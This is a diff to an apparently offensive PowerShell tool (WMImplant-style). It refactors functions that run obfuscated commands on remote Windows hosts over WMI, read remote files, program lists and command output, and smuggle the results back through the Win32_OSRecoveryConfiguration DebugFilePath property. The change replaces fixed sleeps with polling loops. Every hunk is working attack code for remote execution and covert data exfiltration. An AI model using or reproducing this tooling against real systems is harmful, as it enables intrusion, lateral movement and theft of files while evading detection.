@@ -478,12 +478,6 @@ function Get-InstalledPrograms
 
     Process
     {
-        $fullregistrypath = "HKLM:\Software\Microsoft\Windows"
-        $registrydownname = -join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_})
-        # The reghive value is for hkey_local_machine
-        $reghive = 2147483650
-        $regpath = "SOFTWARE\Microsoft\Windows"
-        $SystemHostname = Get-WMIObject Win32_ComputerSystem | Select-Object -ExpandProperty name
 
         if(!$Target)
         {
@@ -501,8 +495,7 @@ function Get-InstalledPrograms
             $Original_WMIProperty = (Get-WmiObject -Class Win32_OSRecoveryConfiguration -ComputerName $Target).DebugFilePath
         }
 
-        # On remote system, save file to registry
-        Write-Verbose "Running remote command and writing on remote registry"
+        Write-Verbose "Running remote command and writing to WMI property"
         $remote_command = '$fct = (Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | format-list | out-string).Trim(); $fctenc=[Int[]][Char[]]$fct -Join '',''; $a = Get-WMIObject -Class Win32_OSRecoveryConfiguration; $a.DebugFilePath = $fctenc; $a.Put()'
 
         if($Creds)
@@ -514,18 +507,39 @@ function Get-InstalledPrograms
             Invoke-WMIObfuscatedPSCommand -PSCommand $remote_command -Target $Target -ObfuscateWithEnvVar
         }
 
-        Write-Verbose "Sleeping to let remote system store the information"
-        Start-Sleep -s 15
-
-        # Grab file from remote system's registry
-        Write-Verbose "Reading info from remote WMI Property"
-        if($Creds)
+        # Poll remote system, and determine if the script is done
+        # If not, sleep and poll again
+        $quit = $false
+        while($quit -eq $false)
         {
-            $modified_WMIObject = Get-WMIObject -Class Win32_OSRecoveryConfiguration -ComputerName $Target -Credential $Creds
-        }
-        else
-        {
-            $modified_WMIObject = Get-WMIObject -Class Win32_OSRecoveryConfiguration -ComputerName $Target
+            Write-Verbose "Polling property to see if the script has completed"
+            if($Creds)
+            {
+                $modified_WMIObject = Get-WMIObject -Class Win32_OSRecoveryConfiguration -ComputerName $Target -Credential $Creds
+            }
+            else
+            {
+                $modified_WMIObject = Get-WMIObject -Class Win32_OSRecoveryConfiguration -ComputerName $Target
+            }
+            
+            try 
+            {
+                if($Original_WMIProperty -match  $modified_WMIObject.DebugFilePath)
+                {
+                    Write-Verbose "Script is not done, sleeping for 5 and trying again"
+                    Start-Sleep -s 5
+                }
+                else 
+                {
+                    Write-Verbose "Script is complete, pulling data now"
+                    $quit = $true
+                }
+            }
+            catch
+            {
+                Write-Verbose "Script is not done, sleeping for 5 and trying again"
+                Start-Sleep -s 5
+            }
         }
     
         $decode = [char[]][int[]]$modified_WMIObject.DebugFilePath.Split(',') -Join ''
@@ -723,8 +737,6 @@ function Invoke-CommandExecution
             $ExecCommand = Read-Host "Please provide the command you'd like to run >"
         }
 
-        $SystemHostname = Get-WMIObject Win32_ComputerSystem | Select-Object -ExpandProperty name
-
         # Get original WMI Property
         if($Creds)
         {
@@ -753,19 +765,41 @@ function Invoke-CommandExecution
             Invoke-WMIObfuscatedPSCommand -PSCommand $remote_command -Target $Target -ObfuscateWithEnvVar
         }
 
-        # Grab output from remote system
-        Write-Verbose "Sleeping, and then reading output from remote WMI Property"
-        Start-Sleep -s 10
-
-        if($Creds)
+        # Poll remote system, and determine if the script is done
+        # If not, sleep and poll again
+        $quit = $false
+        while($quit -eq $false)
         {
-            $modified_WMIObject = Get-WmiObject -Class Win32_OSRecoveryConfiguration -ComputerName $Target -Credential $Creds
+            Write-Verbose "Polling property to see if the script has completed"
+            if($Creds)
+            {
+                $modified_WMIObject = Get-WMIObject -Class Win32_OSRecoveryConfiguration -ComputerName $Target -Credential $Creds
+            }
+            else
+            {
+                $modified_WMIObject = Get-WMIObject -Class Win32_OSRecoveryConfiguration -ComputerName $Target
+            }
+            
+            try 
+            {
+                if($Original_WMIProperty -match  $modified_WMIObject.DebugFilePath)
+                {
+                    Write-Verbose "Script is not done, sleeping for 5 and trying again"
+                    Start-Sleep -s 5
+                }
+                else 
+                {
+                    Write-Verbose "Script is complete, pulling data now"
+                    $quit = $true
+                }
+            }
+            catch
+            {
+                Write-Verbose "Script is not done, sleeping for 5 and trying again"
+                Start-Sleep -s 5
+            }
         }
-        else
-        {
-            $modified_WMIObject = Get-WmiObject -Class Win32_OSRecoveryConfiguration -ComputerName $Target
-        }
-
+    
         $decode = [char[]][int[]]$modified_WMIObject.DebugFilePath.Split(',') -Join ''
         # Print to console
         $decode
@@ -1828,27 +1862,49 @@ function Invoke-RemoteScriptWithOutput
             Invoke-WMIObfuscatedPSCommand -PSCommand $remote_command -Target $Target -ObfuscateWithEnvVar
         }
 
-        # Grab output from remote system
-        Write-Verbose "Sleeping, and then reading file from remote system"
-        Start-Sleep -s 30
-
-        if($Creds)
+        # Poll remote system, and determine if the script is done
+        # If not, sleep and poll again
+        $quit = $false
+        while($quit -eq $false)
         {
-            $results = Get-WmiObject -Class Win32_OSRecoveryConfiguration -ComputerName $Target -Credential $Creds
+            Write-Verbose "Polling property to see if the script has completed"
+            if($Creds)
+            {
+                $modified_WMIObject = Get-WMIObject -Class Win32_OSRecoveryConfiguration -ComputerName $Target -Credential $Creds
+            }
+            else
+            {
+                $modified_WMIObject = Get-WMIObject -Class Win32_OSRecoveryConfiguration -ComputerName $Target
+            }
+            
+            try 
+            {
+                if($encoded_script -eq $modified_WMIObject.DebugFilePath)
+                {
+                    Write-Verbose "Script is not done, sleeping for 5 and trying again"
+                    Start-Sleep -s 5
+                }
+                else 
+                {
+                    Write-Verbose "Script is complete, pulling data now"
+                    $quit = $true
+                }
+            }
+            catch
+            {
+                Write-Verbose "Script is not done, sleeping for 5 and trying again"
+                Start-Sleep -s 5
+            }
         }
-        else
-        {
-            $results = Get-WmiObject -Class Win32_OSRecoveryConfiguration -ComputerName $Target
-        }
-
-        $decode = [char[]][int[]]$results.DebugFilePath.Split(',') -Join ''
+    
+        $decode = [char[]][int[]]$modified_WMIObject.DebugFilePath.Split(',') -Join ''
         # Print to console
         $decode
 
-        # Removing Registry value from remote system
-        Write-Verbose "Removing registry value from remote system"
-        $results.DebugFilePath = $Original_WMIProperty
-        $null = $results.Put()
+        # Replacing original WMI property value from remote system
+        Write-Verbose "Replacing original WMI property value from remote system"
+        $modified_WMIObject.DebugFilePath = $Original_WMIProperty
+        $null = $modified_WMIObject.Put()
 
         Write-Verbose "Done!"
     }
@@ -3866,8 +3922,6 @@ function Get-FileContentsWMImplant
     Process
     {
 
-        $SystemHostname = Get-WMIObject Win32_ComputerSystem | Select-Object -ExpandProperty name
-
         if(!$Target)
         {
             $Target = Read-Host "What system are you targeting? >"
@@ -3891,7 +3945,7 @@ function Get-FileContentsWMImplant
         }
 
         # On remote system, save file to registry
-        Write-Verbose "Reading remote file and writing on remote registry"
+        Write-Verbose "Reading remote file and writing to WMI property"
         $remote_command = '$fct = Get-Content -Encoding byte -Path ''' + "$File" + '''; $fctenc = [Int[]][Char[]]$fct -Join '',''; $a = Get-WmiObject -Class Win32_OSRecoveryConfiguration; $a.DebugFilePath = $fctenc; $a.Put()'
 
         if($Creds)
@@ -3903,26 +3957,47 @@ function Get-FileContentsWMImplant
             Invoke-WMIObfuscatedPSCommand -PSCommand $remote_command -Target $Target -ObfuscateWithEnvVar
         }
 
-        Write-Verbose "Sleeping to let remote system read and store file"
-        Start-Sleep -s 15
-
-        # Grab file from remote system
-        Write-Verbose "Reading file from remote system"
-        if($Creds)
+        # Poll remote system, and determine if the script is done
+        # If not, sleep and poll again
+        $quit = $false
+        while($quit -eq $false)
         {
-            $modified_WMIObject = Get-WmiObject -Class Win32_OSRecoveryConfiguration -ComputerName $Target -Credential $Creds
+            Write-Verbose "Polling property to see if the script has completed"
+            if($Creds)
+            {
+                $modified_WMIObject = Get-WMIObject -Class Win32_OSRecoveryConfiguration -ComputerName $Target -Credential $Creds
+            }
+            else
+            {
+                $modified_WMIObject = Get-WMIObject -Class Win32_OSRecoveryConfiguration -ComputerName $Target
+            }
+            
+            try 
+            {
+                if($Original_WMIProperty -match  $modified_WMIObject.DebugFilePath)
+                {
+                    Write-Verbose "Script is not done, sleeping for 5 and trying again"
+                    Start-Sleep -s 5
+                }
+                else 
+                {
+                    Write-Verbose "Script is complete, pulling data now"
+                    $quit = $true
+                }
+            }
+            catch
+            {
+                Write-Verbose "Script is not done, sleeping for 5 and trying again"
+                Start-Sleep -s 5
+            }
         }
-        else
-        {
-            $modified_WMIObject = Get-WmiObject -Class Win32_OSRecoveryConfiguration -ComputerName $Target
-        }
-
-        $decode =  [char[]][int[]]$modified_WMIObject.DebugFilePath.Split(',') -Join ''
+    
+        $decode = [char[]][int[]]$modified_WMIObject.DebugFilePath.Split(',') -Join ''
         # Print to console
         $decode
 
         # Removing Registry value from remote system
-        Write-Verbose "Removing registry value from remote system"
+        Write-Verbose "Replacing property on remote system"
 
         $modified_WMIObject.DebugFilePath = $Original_WMIProperty
         $null = $modified_WMIObject.Put()
